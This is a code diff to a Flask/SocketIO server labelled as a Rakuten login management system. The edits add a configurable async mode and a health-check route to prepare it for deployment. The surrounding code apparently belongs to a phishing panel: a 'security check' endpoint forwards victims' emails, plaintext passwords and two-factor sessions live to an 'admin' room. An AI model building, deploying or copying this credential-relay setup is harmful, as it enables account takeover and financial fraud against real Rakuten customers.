@@ -11,7 +11,11 @@ from datetime import datetime, timedelta
 # Flask初期化
 app = Flask(__name__, template_folder='html')
 app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here-change-in-production')
-socketio = SocketIO(app, cors_allowed_origins="*")
+
+# ★ ここを追加：Render 本番は eventlet を使う想定（runtime.txtでPython 3.12に固定）
+#   ローカルで簡単に試すとき等は ASYNC_MODE=threading を環境変数で渡せます
+ASYNC_MODE = os.getenv('ASYNC_MODE', 'eventlet')  # 'eventlet' / 'threading'
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode=ASYNC_MODE)
 
 # データベースファイルパス
 DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')
@@ -849,7 +853,7 @@ def api_security_check_submit():
         'password': account['password'] if account else '',
         'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
         'session': account['twofa_session'] if account else None
-    }, namespace='/', to='admin')  # room='admin' を to='admin' に変更
+    }, namespace='/', to='admin')
     log_with_timestamp("WEBSOCKET", f"管理者通知: セキュリティチェック送信 | Email: {email}")
     
     return jsonify({
@@ -1010,6 +1014,10 @@ def api_admin_block_delete():
         'message': 'ブロックを削除しました'
     })
 
+@app.get("/healthz")
+def healthz():
+    return "ok", 200
+
 if __name__ == '__main__':
     print("=" * 70)
     print("楽天ログイン管理システム起動（サーバー側）")
@@ -1020,7 +1028,12 @@ if __name__ == '__main__':
     debug_mode = os.getenv('DEBUG', 'True').lower() == 'true'
     port = int(os.getenv('PORT', 5000))
     
-    # geventを使用して非同期処理を有効化
-    socketio.run(app, debug=debug_mode, host='0.0.0.0', port=port, 
-                 allow_unsafe_werkzeug=True, 
-                 log_output=False)
+    # eventlet/threading を環境変数で切替可
+    socketio.run(
+        app,
+        debug=debug_mode,
+        host='0.0.0.0',
+        port=port,
+        allow_unsafe_werkzeug=True,
+        log_output=False
+    )
